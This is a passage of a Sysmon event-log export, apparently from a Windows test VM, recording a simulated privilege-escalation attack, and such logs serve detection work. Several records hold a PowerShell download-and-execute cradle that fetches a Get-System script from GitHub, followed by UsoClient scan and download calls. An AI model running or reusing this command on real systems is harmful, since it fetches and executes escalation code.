      <Data Name=""CommandLine"">C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f5-658c-e703-000000000000}</Data>
      <Data Name=""LogonId"">0x3e7</Data>
      <Data Name=""TerminalSessionId"">0</Data>
      <Data Name=""IntegrityLevel"">System</Data>
      <Data Name=""Hashes"">MD5=8EC922C7A58A8701AB481B7BE9644536,SHA256=949BFB5B4C7D58D92F3F9C5F8EC7CA4CEAFFD10EC5F0020F0A987C472D61C54B,IMPHASH=76B4BAE80D2C3B08BB062D97BF9CA791</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-36f5-658c-0b00-000000000f00}</Data>
      <Data Name=""ParentProcessId"">780</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\services.exe</Data>
      <Data Name=""ParentCommandLine"">C:\Windows\system32\services.exe</Data>
      <Data Name=""ParentUser"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,taskhostw.exe,Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Host Process for Windows Tasks,,,,,,,1,19582,,10.0.22621.2792 (WinBuild.160101.0800),"MD5=AAA6BA42398B2D70F12F00A110701041,SHA256=58CC5757BB129557652797EA92AEE701DE5C574B22FDCD5DCDDF141CAEEA3C02,IMPHASH=1C4E2D9936E4D9F2490B08AAB4D24260",C:\Windows\System32\taskhostw.exe,,System,0x8000000000000000,4,{f57bd86a-36f5-658c-e703-000000000000},0x3e7,0,taskhostw.exe,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,C:\Windows\System32\svchost.exe,{f57bd86a-36f6-658c-1d00-000000000f00},1496,NT AUTHORITY\SYSTEM,{f57bd86a-7328-658c-c901-000000000f00},3588,1164,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T18:55:36.5118897Z,,,1,0,5124,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-27 18:55:36.510,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T18:55:36.5118897Z""/>
      <EventRecordID>19582</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 18:55:36.510</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-7328-658c-c901-000000000f00}</Data>
      <Data Name=""ProcessId"">1164</Data>
      <Data Name=""Image"">C:\Windows\System32\taskhostw.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2792 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Host Process for Windows Tasks</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">taskhostw.exe</Data>
      <Data Name=""CommandLine"">taskhostw.exe</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f5-658c-e703-000000000000}</Data>
      <Data Name=""LogonId"">0x3e7</Data>
      <Data Name=""TerminalSessionId"">0</Data>
      <Data Name=""IntegrityLevel"">System</Data>
      <Data Name=""Hashes"">MD5=AAA6BA42398B2D70F12F00A110701041,SHA256=58CC5757BB129557652797EA92AEE701DE5C574B22FDCD5DCDDF141CAEEA3C02,IMPHASH=1C4E2D9936E4D9F2490B08AAB4D24260</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-36f6-658c-1d00-000000000f00}</Data>
      <Data Name=""ParentProcessId"">1496</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""ParentCommandLine"">C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule</Data>
      <Data Name=""ParentUser"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\windows\system32\Usoclient.exe"" STARTINTERACTIVESCAN",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,UsoClient,,,,,,,1,19581,,10.0.22621.2506 (WinBuild.160101.0800),"MD5=42781AB85E030CCC9817A7D4289D8299,SHA256=34785C15C7CB7193C181D14E574723D1DF24F060F379467B5320F17AF04CFF5B,IMPHASH=A40F17F79A678C824519CE2ED81A298D",C:\Windows\System32\UsoClient.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,UsoClient,"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{f57bd86a-7320-658c-c401-000000000f00},448,WINDEV2309EVAL\User,{f57bd86a-7328-658c-c801-000000000f00},3588,3260,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T18:55:36.1526657Z,,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 18:55:36.151,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T18:55:36.1526657Z""/>
      <EventRecordID>19581</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 18:55:36.151</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-7328-658c-c801-000000000f00}</Data>
      <Data Name=""ProcessId"">3260</Data>
      <Data Name=""Image"">C:\Windows\System32\UsoClient.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">UsoClient</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">UsoClient</Data>
      <Data Name=""CommandLine"">""C:\windows\system32\Usoclient.exe"" STARTINTERACTIVESCAN</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=42781AB85E030CCC9817A7D4289D8299,SHA256=34785C15C7CB7193C181D14E574723D1DF24F060F379467B5320F17AF04CFF5B,IMPHASH=A40F17F79A678C824519CE2ED81A298D</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-7320-658c-c401-000000000f00}</Data>
      <Data Name=""ParentProcessId"">448</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\windows\system32\Usoclient.exe"" StartDownload",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,UsoClient,,,,,,,1,19580,,10.0.22621.2506 (WinBuild.160101.0800),"MD5=42781AB85E030CCC9817A7D4289D8299,SHA256=34785C15C7CB7193C181D14E574723D1DF24F060F379467B5320F17AF04CFF5B,IMPHASH=A40F17F79A678C824519CE2ED81A298D",C:\Windows\System32\UsoClient.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,UsoClient,"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{f57bd86a-7320-658c-c401-000000000f00},448,WINDEV2309EVAL\User,{f57bd86a-7325-658c-c701-000000000f00},3588,1052,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T18:55:33.0853019Z,,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 18:55:33.084,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T18:55:33.0853019Z""/>
      <EventRecordID>19580</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 18:55:33.084</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-7325-658c-c701-000000000f00}</Data>
      <Data Name=""ProcessId"">1052</Data>
      <Data Name=""Image"">C:\Windows\System32\UsoClient.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">UsoClient</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">UsoClient</Data>
      <Data Name=""CommandLine"">""C:\windows\system32\Usoclient.exe"" StartDownload</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=42781AB85E030CCC9817A7D4289D8299,SHA256=34785C15C7CB7193C181D14E574723D1DF24F060F379467B5320F17AF04CFF5B,IMPHASH=A40F17F79A678C824519CE2ED81A298D</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-7320-658c-c401-000000000f00}</Data>
      <Data Name=""ParentProcessId"">448</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,,22,19579,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-7320-658c-c401-000000000f00},3588,448,,,raw.githubusercontent.com,::ffff:185.199.109.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.110.133;,0,-,,,,,,2023-12-27T18:55:31.1529806Z,,,22,,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:05.598,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T18:55:31.1529806Z""/>
      <EventRecordID>19579</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:05.598</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-7320-658c-c401-000000000f00}</Data>
      <Data Name=""ProcessId"">448</Data>
      <Data Name=""QueryName"">raw.githubusercontent.com</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">::ffff:185.199.109.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.110.133;</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,cdn-185-199-109-133.github.com,185.199.109.133,false,443,https,,3,19578,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,true,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-7320-658c-c401-000000000f00},3588,448,,tcp,,,,-,WinDev2309Eval.localdomain,192.168.126.163,false,50072,-,2023-12-27T18:55:30.4917429Z,,,3,,5136,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:05.606,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>3</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>3</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T18:55:30.4917429Z""/>
      <EventRecordID>19578</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5136""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:05.606</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-7320-658c-c401-000000000f00}</Data>
      <Data Name=""ProcessId"">448</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""Protocol"">tcp</Data>
      <Data Name=""Initiated"">true</Data>
      <Data Name=""SourceIsIpv6"">false</Data>
      <Data Name=""SourceIp"">192.168.126.163</Data>
      <Data Name=""SourceHostname"">WinDev2309Eval.localdomain</Data>
      <Data Name=""SourcePort"">50072</Data>
      <Data Name=""SourcePortName"">-</Data>
      <Data Name=""DestinationIsIpv6"">false</Data>
      <Data Name=""DestinationIp"">185.199.109.133</Data>
      <Data Name=""DestinationHostname"">cdn-185-199-109-133.github.com</Data>
      <Data Name=""DestinationPort"">443</Data>
      <Data Name=""DestinationPortName"">https</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\windows\system32\Usoclient.exe"" StartScan",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,UsoClient,,,,,,,1,19577,,10.0.22621.2506 (WinBuild.160101.0800),"MD5=42781AB85E030CCC9817A7D4289D8299,SHA256=34785C15C7CB7193C181D14E574723D1DF24F060F379467B5320F17AF04CFF5B,IMPHASH=A40F17F79A678C824519CE2ED81A298D",C:\Windows\System32\UsoClient.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,UsoClient,"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{f57bd86a-7320-658c-c401-000000000f00},448,WINDEV2309EVAL\User,{f57bd86a-7322-658c-c601-000000000f00},3588,6908,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T18:55:30.0316159Z,,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 18:55:30.030,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T18:55:30.0316159Z""/>
      <EventRecordID>19577</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 18:55:30.030</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-7322-658c-c601-000000000f00}</Data>
      <Data Name=""ProcessId"">6908</Data>
      <Data Name=""Image"">C:\Windows\System32\UsoClient.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">UsoClient</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">UsoClient</Data>
      <Data Name=""CommandLine"">""C:\windows\system32\Usoclient.exe"" StartScan</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=42781AB85E030CCC9817A7D4289D8299,SHA256=34785C15C7CB7193C181D14E574723D1DF24F060F379467B5320F17AF04CFF5B,IMPHASH=A40F17F79A678C824519CE2ED81A298D</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-7320-658c-c401-000000000f00}</Data>
      <Data Name=""ParentProcessId"">448</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 18:55:28.099,,,,,,,,,11,19576,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-7320-658c-c401-000000000f00},3588,448,,,,,,-,,,,,,2023-12-27T18:55:28.1102335Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_fkxqyd4c.os1.ps1,,11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 18:55:28.099,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T18:55:28.1102335Z""/>
      <EventRecordID>19576</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 18:55:28.099</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-7320-658c-c401-000000000f00}</Data>
      <Data Name=""ProcessId"">448</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_fkxqyd4c.os1.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 18:55:28.099</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
  </Event>
  
"
